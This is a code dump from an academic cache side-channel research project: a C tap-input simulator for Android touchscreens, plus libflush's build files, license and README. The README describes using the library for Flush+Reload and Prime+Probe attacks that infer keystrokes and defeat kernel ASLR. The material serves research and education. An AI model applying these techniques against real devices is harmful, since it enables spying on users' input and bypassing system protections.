```

`input_simulator/input-simulator/key-mapping.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef KEY_MAPPING_H
#define KEY_MAPPING_H

typedef struct key_mapping_s {
  char* input;
  int x;
  int y;
} key_mapping_t;

extern key_mapping_t key_mappings[];

#endif  /*KEY_MAPPING_H*/

```

`input_simulator/input-simulator/main.c`:

```c
 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>

#include "simulator.h"

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS] <character>\n", argv[0]);
  fprintf(stdout, "Application Options:\n");
  fprintf(stdout, "\t-r, -repititions <range>\t Number of repititions to execute the event\n");
  fprintf(stdout, "\t-d, -delay <delay>\t Delay in seconds\n");
  fprintf(stdout, "\t-h, -help\t Help page\n");
}

int main(int argc, char* argv[])
{
  /* Define parameters */
  ssize_t repititions  = 1;
  useconds_t delay = 50000;

  /* Parse arguments */
  static const char* short_options = "r:d:h";
  static struct option long_options[] = {
    {"repitition", required_argument, NULL, 'r'},
    {"delay",      required_argument, NULL, 'd'},
    {"help",       no_argument, NULL, 'h'},
    { NULL,        0, NULL, 0}
  };

  opterr = 0;

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'r':
        {
          if (!sscanf(optarg,"%zd",&repititions)) {
            fprintf(stderr, "Could not parse repititions parameter: %s\n", optarg);
            return -1;
          }
        }
        break;
      case 'd':
        {
          float delay_seconds;
          if (!sscanf(optarg,"%f", &delay_seconds)) {
            fprintf(stderr, "Could not parse delay parameter: %s\n", optarg);
            return -1;
          }

          delay = delay_seconds * 1000 * 1000;
        }
        break;
      case 'h':
        print_help(argv);
        break;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  if (optind >= argc) {
    fprintf(stderr, "Error: No character passed\n");
    return 0;
  }

  char* input = argv[optind];

  /* Init simulator */
  simulator_t* simulator;
  if (simulator_init(&simulator) == false) {
    fprintf(stderr, "Could not initialize simulator\n");
    return -1;
  }

  /* Find key mapping */
  int x = 0;
  int y = 0;
  if (simulator_get_coordinates(simulator, input, &x, &y) == false) {
    fprintf(stderr, "Could not find mapping for input '%s'\n", input);
  }

  /* Simulate taps */
  for (ssize_t i = 0; i < repititions || repititions < 0; i++) {
    simulator_send_tap(simulator, x, y);
    usleep(delay);
  }

  /* Terminate simulator */
  if (simulator_terminate(simulator) == false) {
    fprintf(stderr, "Could not terminate simulator\n");
    return -1;
  }

  return 0;
}


```

`input_simulator/input-simulator/simulator.c`:

```c
/* See LICENSE file for license and copyright information */

#include "simulator.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <sched.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

struct simulator_s {
  int fd_tap;
};

static bool send_event(int fd, uint16_t type, uint16_t code, uint32_t value);

bool
simulator_init(simulator_t** simulator)
{
  if (simulator == NULL) {
    return false;
  }

  *simulator = calloc(1, sizeof(simulator_t));
  if (*simulator == NULL) {
    return false;
  }

#if defined(ALTO45)
  (*simulator)->fd_tap = open("/dev/input/event5", O_WRONLY);
#elif defined(MAKO)
  (*simulator)->fd_tap = open("/dev/input/event2", O_WRONLY);
#else
  (*simulator)->fd_tap = open("/dev/input/event1", O_WRONLY);
#endif
  if ((*simulator)->fd_tap < 0) {
    fprintf(stderr, "[simulator] error: Could not open event path\n");
    return false;
  }

  return true;
}

bool
simulator_terminate(simulator_t* simulator)
{
  if (simulator == NULL) {
    return false;
  }

  if (simulator->fd_tap >= 0) {
    close(simulator->fd_tap);
  }

  free(simulator);

  return true;
}

static bool
send_event(int fd, uint16_t type, uint16_t code, uint32_t value)
{
  struct input_event event;
  memset(&event, 0, sizeof(event));

  event.type = type;
  event.code = code;
  event.value = value;

  ssize_t ret = write(fd, &event, sizeof(event));
  if(ret < (ssize_t) sizeof(event)) {
    fprintf(stderr, "Could not write\n");
    return false;
  }

  return true;
}

bool simulator_send_char(simulator_t* simulator, const char* key)
{
  if (simulator == NULL || key == NULL) {
    return false;
  }

  key_mapping_t* key_mapping = NULL;
  for (unsigned int i = 0; key_mappings[i].input != NULL; i++) {
    if (strcmp(key_mappings[i].input, key) == 0) {
      key_mapping = &key_mappings[i];
      break;
    }
  }

  if (key_mapping != NULL) {
    simulator_send_tap(simulator, key_mapping->x, key_mapping->y);
  }

  return true;
}

bool
simulator_get_coordinates(simulator_t* simulator, const char* input, int* x, int* y)
{
  if (simulator == NULL || input == NULL || x == NULL || y == NULL) {
    return false;
  }

  for (unsigned int i = 0; key_mappings[i].input != NULL; i++) {
    if (strcmp(key_mappings[i].input, input) == 0) {
      *x = key_mappings[i].x;
      *y = key_mappings[i].y;
      return true;
    }
  }

  return false;
}

#if defined(ALTO45)
bool
simulator_send_tap(simulator_t* simulator, int x, int y)
{
  int fd = simulator->fd_tap;

  if (send_event(fd, EV_ABS, ABS_MT_SLOT, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 49) == false) {
    return false;
  }
  if (send_event(fd, EV_ABS, ABS_MT_POSITION_X, x) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_POSITION_Y, y) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, BTN_TOUCH, 1) == false) {
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, -1) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, BTN_TOUCH, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  sched_yield();

  return true;
}
#elif defined(MAKO)
bool
simulator_send_tap(simulator_t* simulator, int x, int y)
{
  y *= 2;
  x *= 2;

  int fd = simulator->fd_tap;

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 49) == false) {
    return false;
  }
  if (send_event(fd, EV_ABS, ABS_MT_POSITION_X, x) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_POSITION_Y, y) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, ABS_MT_PRESSURE, 31) == false) {
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, -1) == false) {
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  sched_yield();

  return true;
}
#elif defined(ZEROFLTE)
bool
simulator_send_tap(simulator_t* simulator, int x, int y)
{
  y *= 1.6;
  x *= 2.8;

  int fd = simulator->fd_tap;

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 49) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, BTN_TOUCH, 1) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, 0x14a, 1) == false) { // FINGER
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_POSITION_X, x) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_POSITION_Y, y) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, ABS_MT_TOUCH_MAJOR, 4) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, ABS_MT_TOUCH_MINOR, 4) == false) {
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 255) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, BTN_TOUCH, 0) == false) {
    return false;
  }

  if (send_event(fd, EV_KEY, 0x14a, 0) == false) { // FINGER
    return false;
  }

  if (send_event(fd, EV_SYN, SYN_REPORT, 0) == false) {
    return false;
  }

  sched_yield();

  return true;
}
#endif

```

`input_simulator/input-simulator/simulator.h`:

```h
 /* See LICENSE file for license and copyright information */

#ifndef SIMULATOR_H
#define SIMULATOR_H

#include <stdlib.h>
#include <stdbool.h>

#include "key-mapping.h"

typedef struct simulator_s simulator_t;

bool simulator_init(simulator_t** simulator);
bool simulator_terminate(simulator_t* simulator);

bool simulator_send_tap(simulator_t* simulator, int x, int y);

bool simulator_send_char(simulator_t* simulator, const char* key);

bool simulator_get_coordinates(simulator_t* simulator, const char* input, int* x, int* y);

#endif  /*SIMULATOR_H*/

```

`libflush/Android.mk`:

```mk
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

include config.mk

LOCAL_MODULE := libflush_shared
LOCAL_MODULE_FILENAME := libflush

LOCAL_CFLAGS += ${CFLAGS}

LOCAL_SRC_FILES := $(wildcard libflush/*.c)
LOCAL_SRC_FILES += $(wildcard libflush/eviction/*.c)

ifeq ($(TARGET_ARCH_ABI),armeabi-v7a)
LOCAL_SRC_FILES += $(wildcard libflush/armv7/*.c)
USE_EVICTION = 1
endif
ifeq ($(TARGET_ARCH_ABI),arm64-v8a)
LOCAL_SRC_FILES += $(wildcard libflush/armv8/*.c)
LOCAL_CFLAGS += -D__ARM_ARCH_8A__
endif

ifeq (,$(findstring ${TIME_SOURCE},${TIME_SOURCES}))
$(error ${TIME_SOURCE} is an invalid time source. $(TIME_SOURCES))
else
TIME_SOURCE_UC = $(shell echo $(TIME_SOURCE) | tr a-z A-Z)
LOCAL_CFLAGS += -DTIME_SOURCE=TIME_SOURCE_${TIME_SOURCE_UC}
endif

ifneq (${DEVICE_CONFIGURATION},0)
ifneq ("$(wildcard ${DEVICE_CONFIGURATION})","")
LOCAL_CFLAGS += -DDEVICE_CONFIGURATION=${DEVICE_CONFIGURATION}
else
LOCAL_CFLAGS += -DDEVICE_CONFIGURATION="strategies/${DEVICE_CONFIGURATION}.h"
endif
endif

ifneq (${USE_EVICTION},0)
LOCAL_CFLAGS += -DUSE_EVICTION=${USE_EVICTION}
endif

ifneq (${HAVE_PAGEMAP_ACCESS},0)
LOCAL_CFLAGS += -DHAVE_PAGEMAP_ACCESS=${HAVE_PAGEMAP_ACCESS}
endif

ifneq (${ANDROID_PLATFORM},0)
LOCAL_CFLAGS += -DANDROID_PLATFORM=$(subst android-,,${ANDROID_PLATFORM})
endif

ifneq (${WITH_PTHREAD},0)
LOCAL_CFLAGS += -DPTHREAD_ENABLE
endif

# include $(BUILD_SHARED_LIBRARY)
include $(BUILD_STATIC_LIBRARY)

```

`libflush/Application.mk`:

```mk
# Use alternate build script
APP_BUILD_SCRIPT := Android.mk

# This variable contains the name of the target Android platform.
APP_PLATFORM := android-21

# By default, the NDK build system generates machine code for the armeabi ABI.
# This machine code corresponds to an ARMv5TE-based CPU with software floating
# point operations. You can use APP_ABI to select a different ABI.
#
# See https://developer.android.com/ndk/guides/application_mk.html
APP_ABI := x86_64 armeabi-v7a arm64-v8a

```

`libflush/LICENSE`:

```
Copyright (c) 2015-2016 Moritz Lipp

This software is provided 'as-is', without any express or implied
warranty. In no event will the authors be held liable for any damages
arising from the use of this software.

Permission is granted to anyone to use this software for any purpose,
including commercial applications, and to alter it and redistribute it
freely, subject to the following restrictions:

   1. The origin of this software must not be misrepresented; you must not
   claim that you wrote the original software. If you use this software
   in a product, an acknowledgment in the product documentation would be
   appreciated but is not required.

   2. Altered source versions must be plainly marked as such, and must not be
   misrepresented as being the original software.

   3. This notice may not be removed or altered from any source
   distribution.

```

`libflush/Makefile`:

```
# See LICENSE file for license and copyright information

include config.mk
include colors.mk
include common.mk

SOURCE = $(wildcard ${PROJECT}/*.c ${PROJECT}/eviction/*.c)

ifeq "${ARCH}" "x86"
	SOURCE += $(wildcard ${PROJECT}/x86/*.c)
	LDFLAGS += -pthread
endif

ifeq "${ARCH}" "armv7"
	SOURCE += $(wildcard ${PROJECT}/armv7/*.c)
	USE_EVICTION = 1
	include config-arm.mk
endif

ifeq "${ARCH}" "armv8"
	SOURCE += $(wildcard ${PROJECT}/armv8/*.c)
	CPPFLAGS += -D__ARM_ARCH_8A__
	include config-arm64.mk
endif

OBJECTS         = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG   = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})
OBJECTS_GCOV    = $(addprefix ${BUILDDIR_GCOV}/,${SOURCE:.c=.o})
HEADERS         = $(filter-out ${PROJECT}/version.h, \
                  $(wildcard \
                    ${PROJECT}/*.h \
                  ))
HEADERS_INSTALL = ${HEADERS} ${PROJECT}/version.h

ifeq (,$(findstring ${TIME_SOURCE},${TIME_SOURCES}))
$(error ${TIME_SOURCE} is an invalid time source. $(TIME_SOURCES))
else
TIME_SOURCE_UC = $(shell echo $(TIME_SOURCE) | tr a-z A-Z)
CPPFLAGS += -DTIME_SOURCE=TIME_SOURCE_${TIME_SOURCE_UC}
endif

ifneq (${DEVICE_CONFIGURATION},0)
ifneq ("$(wildcard ${DEVICE_CONFIGURATION})","")
CPPFLAGS += -DDEVICE_CONFIGURATION=${DEVICE_CONFIGURATION}
else
CPPFLAGS += -DDEVICE_CONFIGURATION="strategies/${DEVICE_CONFIGURATION}.h"
endif
endif

ifneq (${USE_EVICTION},0)
CPPFLAGS += -DUSE_EVICTION=${USE_EVICTION}
endif

ifneq (${HAVE_PAGEMAP_ACCESS},0)
CPPFLAGS += -DHAVE_PAGEMAP_ACCESS=${HAVE_PAGEMAP_ACCESS}
endif

ifneq (${ANDROID_PLATFORM},0)
CPPFLAGS += -DANDROID_PLATFORM=$(subst android-,,${ANDROID_PLATFORM})
endif

ifneq (${WITH_PTHREAD},0)
CPPFLAGS += -DPTHREAD_ENABLE
LIBS += -pthread
endif

ifneq (${WITH_LIBFIU},0)
INCS += ${FIU_INC}
LIBS += ${FIU_LIB}
CPPFLAGS += -DFIU_ENABLE
endif

all: options ${PROJECT}

options:
	$(ECHO) ${PROJECT} build options:
	$(ECHO) "CFLAGS   = ${CFLAGS}"
	$(ECHO) "CPPFLAGS = ${CPPFLAGS}"
	$(ECHO) "LDFLAGS  = ${LDFLAGS}"
	$(ECHO) "DFLAGS   = ${DFLAGS}"
	$(ECHO) "CC       = ${CC}"

${PROJECT}/version.h: ${PROJECT}/version.h.in config.mk
	$(QUIET)sed 's/ZVMAJOR/${LIBFLUSH_VERSION_MAJOR}/' < ${PROJECT}/version.h.in | \
		sed 's/ZVMINOR/${LIBFLUSH_VERSION_MINOR}/' | \
		sed 's/ZVREV/${LIBFLUSH_VERSION_REV}/' | \
		sed 's/ZVAPI/${LIBFLUSH_VERSION_API}/' | \
		sed 's/ZVABI/${LIBFLUSH_VERSION_ABI}/' > ${PROJECT}/version.h

# release build

${OBJECTS}:  config.mk ${PROJECT}/version.h

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${PROJECT}: ${PROJECT}/version.h static shared

static: ${BUILDDIR_RELEASE}/${PROJECT}.a
shared: ${BUILDDIR_RELEASE}/${PROJECT}.so.${SOVERSION}

${BUILDDIR_RELEASE}/${PROJECT}.a: ${OBJECTS}
	$(call colorecho,AR,$@)
	$(QUIET)${AR} rcs ${BUILDDIR_RELEASE}/${PROJECT}.a ${OBJECTS}

${BUILDDIR_RELEASE}/${PROJECT}.so.${SOVERSION}: ${OBJECTS}
	$(call colorecho,LD,$@)
	$(QUIET)${CC} -Wl,-soname,${PROJECT}.so.${SOMAJOR} -shared ${LDFLAGS} \
		-o ${BUILDDIR_RELEASE}/${PROJECT}.so.${SOVERSION} ${OBJECTS} ${LIBS}

release: options ${PROJECT}

# debug build

${OBJECTS_DEBUG}: config.mk ${PROJECT}/version.h

${BUILDDIR_DEBUG}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${PROJECT}-debug: ${PROJECT}/version.h static-debug shared-debug

static-debug: ${BUILDDIR_DEBUG}/${PROJECT}.a
shared-debug: ${BUILDDIR_DEBUG}/${PROJECT}.so.${SOVERSION}

${BUILDDIR_DEBUG}/${PROJECT}.a: ${OBJECTS_DEBUG}
	$(call colorecho,AR,${PROJECT}.a)
	$(QUIET)${AR} rc ${BUILDDIR_DEBUG}/${PROJECT}.a ${OBJECTS_DEBUG}

${BUILDDIR_DEBUG}/${PROJECT}.so.${SOVERSION}: ${OBJECTS_DEBUG}
	$(call colorecho,LD,${PROJECT}.so.${SOMAJOR})
	$(QUIET)${CC} -Wl,-soname,${PROJECT}.so.${SOMAJOR} -shared ${LDFLAGS} \
		-o ${BUILDDIR_DEBUG}/${PROJECT}.so.${SOVERSION} ${OBJECTS_DEBUG} ${LIBS}

debug: options ${PROJECT}-debug

# gcov build

${OBJECTS_GCOV}: config.mk ${PROJECT}/version.h

${BUILDDIR_GCOV}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${GCOV_CFLAGS} ${DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${PROJECT}-gcov: ${PROJECT}/version.h static-gcov shared-gcov

static-gcov: ${BUILDDIR_GCOV}/${PROJECT}.a
shared-gcov: ${BUILDDIR_GCOV}/${PROJECT}.so.${SOVERSION}

${BUILDDIR_GCOV}/${PROJECT}.a: ${OBJECTS_GCOV}
	$(call colorecho,AR,${PROJECT}.a)
	$(QUIET)${AR} rc ${BUILDDIR_GCOV}/${PROJECT}.a ${OBJECTS_GCOV}

${BUILDDIR_GCOV}/${PROJECT}.so.${SOVERSION}: ${OBJECTS_GCOV}
	$(call colorecho,LD,${PROJECT}.so.${SOMAJOR})
	$(QUIET)${CC} -Wl,-soname,${PROJECT}.so.${SOMAJOR} -shared ${LDFLAGS} ${GCOV_LDFLAGS} \
		-o ${BUILDDIR_GCOV}/${PROJECT}.so.${SOVERSION} ${OBJECTS_GCOV} ${LIBS}

gcov: options ${PROJECT}-gcov
	$(QUIET)${MAKE} -C tests run-gcov
	$(call colorecho,LCOV,"Analyse data")
	$(QUIET)${LCOV_EXEC} ${LCOV_FLAGS}
	$(call colorecho,LCOV,"Generate report")
	$(QUIET)${GENHTML_EXEC} ${GENHTML_FLAGS}

clean:
	$(call colorecho,RM, "Clean objects and builds")
	$(QUIET)rm -rf ${BUILDDIR}

	$(call colorecho,RM, "Clean android specific objects and builds")
	$(QUIET)rm -rf obj libs

	$(call colorecho,RM, "Clean pkg-config files")
	$(QUIET)rm -rf ${PROJECT}.pc

	$(call colorecho,RM, "Clean dependencies")
	$(QUIET)rm -rf ${DEPENDDIR}

	$(call colorecho,RM, "Clean distribution files")
	$(QUIET)rm -rf ${PROJECT}-${VERSION}.tar.gz
	$(QUIET)rm -rf ${PROJECT}.info
	$(QUIET)rm -rf ${PROJECT}/version.h

	$(call colorecho,RM, "Clean code analysis")
	$(QUIET)rm -rf ${LCOV_OUTPUT}
	$(QUIET)rm -rf gcov

	$(QUIET)${MAKE} -C tests clean
	$(QUIET)${MAKE} -C doc clean

doc:
	$(QUIET)${MAKE} -C doc

test: ${PROJECT}
	$(QUIET)${MAKE} -C tests run

example: ${PROJECT}
	$(QUIET)${MAKE} -C example

${PROJECT}.pc: ${PROJECT}.pc.in config.mk
	$(QUIET)echo project=${PROJECT} > ${PROJECT}.pc
	$(QUIET)echo version=${VERSION} >> ${PROJECT}.pc
	$(QUIET)echo apiversion=${LIBFLUSH_VERSION_API} >> ${PROJECT}.pc
	$(QUIET)echo abiversion=${LIBFLUSH_VERSION_ABI} >> ${PROJECT}.pc
	$(QUIET)echo includedir=${INCLUDEDIR} >> ${PROJECT}.pc
	$(QUIET)echo libdir=${LIBDIR} >> ${PROJECT}.pc
	$(QUIET)cat ${PROJECT}.pc.in >> ${PROJECT}.pc

install-static: static
	$(call colorecho,INSTALL,"Install static library")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${LIBDIR}
	$(QUIET)install -m 644 ${BUILDDIR_RELEASE}/${PROJECT}.a ${DESTDIR}${LIBDIR}

install-shared: shared
	$(call colorecho,INSTALL,"Install shared library")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${LIBDIR}
	$(QUIET)install -m 644 ${BUILDDIR_RELEASE}/${PROJECT}.so.${SOVERSION} ${DESTDIR}${LIBDIR}
	$(QUIET)ln -s ${PROJECT}.so.${SOVERSION} ${DESTDIR}${LIBDIR}/${PROJECT}.so.${SOMAJOR} || \
		echo "Failed to create ${PROJECT}.so.${SOMAJOR}. Please check if it exists and points to the correct version of ${PROJECT}.so."
	$(QUIET)ln -s ${PROJECT}.so.${SOVERSION} ${DESTDIR}${LIBDIR}/${PROJECT}.so || \
		echo "Failed to create ${PROJECT}.so. Please check if it exists and points to the correct version of ${PROJECT}.so."

install: options install-static install-shared install-headers

install-headers: ${PROJECT}/version.h ${PROJECT}.pc
	$(call colorecho,INSTALL,"Install pkg-config file")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${LIBDIR}/pkgconfig
	$(QUIET)install -m 644 ${PROJECT}.pc ${DESTDIR}${LIBDIR}/pkgconfig
	$(call colorecho,INSTALL,"Install header files")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${INCLUDEDIR}/${PROJECT}
	$(QUIET)for header in ${HEADERS_INSTALL}; do \
		mkdir -m 755 -p ${DESTDIR}${INCLUDEDIR}/`dirname $$header`; \
		install -m 644 $$header ${DESTDIR}${INCLUDEDIR}/$$header; \
	done

uninstall: uninstall-headers
	$(call colorecho,UNINSTALL,"Remove library files")
	$(QUIET)rm -f ${LIBDIR}/${PROJECT}.a ${LIBDIR}/${PROJECT}.so.${SOVERSION} \
		${LIBDIR}/${PROJECT}.so.${SOMAJOR} ${LIBDIR}/${PROJECT}.so

uninstall-headers:
	$(call colorecho,UNINSTALL,"Remove header files")
	$(QUIET)rm -rf ${INCLUDEDIR}/${PROJECT}
	$(call colorecho,UNINSTALL,"Remove pkg-config file")
	$(QUIET)rm -f ${LIBDIR}/pkgconfig/${PROJECT}.pc

.PHONY: all options clean debug test dist install install-headers \
	uninstall ninstall-headers ${PROJECT} ${PROJECT}-debug static shared \
	install-static install-shared

DEPENDS = ${DEPENDDIRS:^=${DEPENDDIR}/}$(addprefix ${DEPENDDIR}/,${OBJECTS:.o=.o.dep})
-include ${DEPENDS}

```

`libflush/README.md`:

```md
# libflush

libflush is a library to launch cache attacks on x86 as well as ARMv7 and ARMv8 architecture. It allows to easily implement attacks based on [Prime+Probe](https://eprint.iacr.org/2005/271.pdf), [Flush+Reload](https://eprint.iacr.org/2013/448.pdf), [Evict+Reload](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf), [Flush+Flush](http://arxiv.org/abs/1511.04594) and [Prefetch]() attack techniques and thus offers a great playground for research and education purposes.

We have developed this library in the [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper and used it to build covert-channels that outperform state-of-the-art covert channels on Android by several orders of magnitude. We utilized it to implement [cache template attacks](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf) that monitor tap and swipe events as well as keystrokes, and even derive the words entered on the touchscreen. Moreover, we used it to attack cryptographic primitives in Java and to monitor cache activity in the ARM TrustZone from the normal world. With the [Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR]() paper we have extended the library to support prefetch attack techniques to obtain address information that can be used to defeat SMAP, SMEP and kernel ASLR.

The [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper by Lipp, Gruss, Spreitzer, Maurice and Mangard will be published at the Usenix Security Symposium 2016. The
[Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR]() paper by Gruss, Fogh, Maurice, Lipp and Mangard will be published at ACM Conference on Computer and Communications Security 2016.


## Table of content

- [Installation](#installation)
    - [Dependencies](#dependencies)
- [Build Configuration](#build-configuration)
- [Advanced Configuration](#advanced-configuration)
    - [Eviction strategy](#eviction-strategy)
    - [Timing measurements](#timing-measurements)
- [Usage](#usage)
    - [Initialization and termination](#initialization)
    - [Flush or evict an address](#flush-or-evict-an-address)
    - [Get timing information](#timing-information)
- [Example](#example)
- [License](#license)
- [References](#references)

## Installation

The library is shipped with a Makefile and can be compiled by running:
```bash
make
```

The necessary header files and the shared and static build library can be installed on the host system:
```bash
make install
```

In addition we provide a debug build that can be initiated by calling `make debug` as well as a simple test suite that can be run by calling `make test`. Code coverage of the test suite can be determined by running `make gcov`. Additional documentation can be build with the `make doc` target.

Additionally we provide an `Android.mk` and an `Application.mk` file that can be
used to build the library with the [Android NDK](https://developer.android.com/ndk/index.html) toolset:

```bash
ndk-build NDK_APPLICATION_MK=`pwd`/Application.mk NDK_PROJECT_PATH=`pwd`
```

### Dependencies
libflush does not require any dependencies except for running the test suite.
However, by default it uses the toolchains provided by the Android NDK if built
for _armv7_ or _armv8_.

* [Android NDK](https://developer.android.com/ndk/index.html) - Android Native
    Development Kit (optional, for ARM builds)
* [check](https://libcheck.github.io/check/) - Unit Testing Framework for C (optional, for test cases)
* [libfiu](https://blitiri.com.ar/p/libfiu/) - Fault injection in userspace (optional, for test cases)
* [doxygen](www.doxygen.org) (optional, for HTML documentation)
* [Sphinx](http://www.sphinx-doc.org) (optional, for HTML documentation)
* [sphinx_rtd_theme](https://github.com/snide/sphinx_rtd_theme) (optional, for HTML documentation)
* [breathe](https://github.com/michaeljones/breathe) (optional, for HTML documentation)

## Build Configuration

The build system makes use of several configuration files. The parameters can be adjusted by modifying the files accordingly or by passing them to make (`make ARCH=x86`). The most important properties are the following:

* `ARCH`: Defines the target architecture.
    * _x86_ (default) - Support for _i386_ and _x86_64_
    * _armv7_ - Support for ARMv7
    * _armv8_ - Support for ARMv8
* `USE_EVICTION`: Use eviction instead of flush instruction in flush based functions. Required for devices that do not expose a flush instruction (default: 0, enabled by default for _armv7_ architecture).
* `DEVICE_CONFIGURATION`: Defines cache and eviction based properties for the target device if eviction is used. See [libflush/eviction/strategies](libflush/eviction/strategies) for example device configurations.
    * _default_ (default) - Default device configuration.
    * _alto45_ - Alcatel OneTouch POP 2
    * _bacon_ - OnePlus One
    * _mako_ - Nexus 4
    * _hammerhead_ - Nexus 5
    * _tilapia_ - Nexus 7
    * _manta_ - Nexus 10
    * _zeroflte_ - Samsung Galaxy S6
* `TIME_SOURCE`: Gives the possibility to use different timing sources to measure the
execution time. Depending on the available privileges, one might want to change
the timing source.
    * _register_ - Performance register / Time-stamp counter (default)
    * _perf_ - Perf interface
    * _monotonic_clock_ - Monotonic clock
    * _thread_counter_ - Dedicated thread counter
* `WITH_PTHREAD`: Build with pthread support.
* `HAVE_PAGEMAP_ACCESS`: Defines if access to _/proc/self/pagemap_ is granted.

If the library is build for the ARMv7 or the ARMv8 architecture the build system uses the [config-arm.mk](config-arm.mk) or [config-arm64.mk](config-arm64.mk) configuration file. By default the build system makes use of the toolchains provided by the [Android NDK](https://developer.android.com/ndk/index.html), thus its possible that the installation path of the NDK needs to be modified:

* `ANDROID_NDK_PATH`: Path to the installation of the Android NDK.
    * _/opt/android-ndk_ (default)
* `ANDROID_PLATFORM`: Defines the used Android platform that is used.
    * _android-21_ (default)

If you prefer to use a different toolchain/compiler, feel free to change `CC` and other properties accordingly.

## Advanced Configuration

### Eviction strategy
If eviction is used, libflush uses the parameters defined by the `DEVICE_CONFIGURATION`. The device configuration is represented by a header file in [libflush/eviction/strategies](libflush/eviction/strategies) and is structured as the following:

**Cache specific configuration**
* `NUMBER_OF_SETS`: The number of sets in the cache
* `LINE_LENGTH`: The line length
* `LINE_LENGTH_LOG2`: The log base 2 of the line length

**Eviction strategy configuration**
* `ES_EVICTION_COUNTER`: Length of the loop
* `ES_NUMBER_OF_ACCESSES_IN_LOOP`: Number of accesses of an address in one loop round
* `ES_DIFFERENT_ADDRESSES_IN_LOOP`: Number of different addresses in one loop round

## Usage
The following sections illustrate the usage of libflush. For a complete overview
of the available functions please refer to the source code or to the
documentation that can be build.

### Initialization and termination

In order to use libflush one needs to include the header file and call the `libflush_init` to initialize
the library. In the end `libflush_terminate` needs to be called to clean-up.
```c
#include <libflush.h>

int main(int argc, char* argv[]) {
    // Initialize libflush
    libflush_session_t* libflush_session;
    if (libflush_init(&libflush_session, NULL) == false) {
        return -1;
    }

    // Use libflush...

    // Terminate libflush
    if (libflush_terminate(libflush_session) == false) {
        return -1;
    }

    return 0;
}
```
and link against the library:
```
gcc example.c `pkg-config --libs libflush`
```

### Flush or evict an address

To evict an address from the cache to the main memory, a dedicated flush
instruction (if available) or eviction can be used.

```c
void* address = &foo;

// Use the flush instruction (if possible)
libflush_flush(libflush_session, address);

// Use eviction
libflush_evict(libflush_session, address);
```

### Get timing information

To retrieve a time stamp depending on the used time source can be achieved with
the following function.

```c
uint64 time = libflush_get_timing(libflush_session);
```

In addition wrapper functions to measure the
execution time of different functions are given.

```c
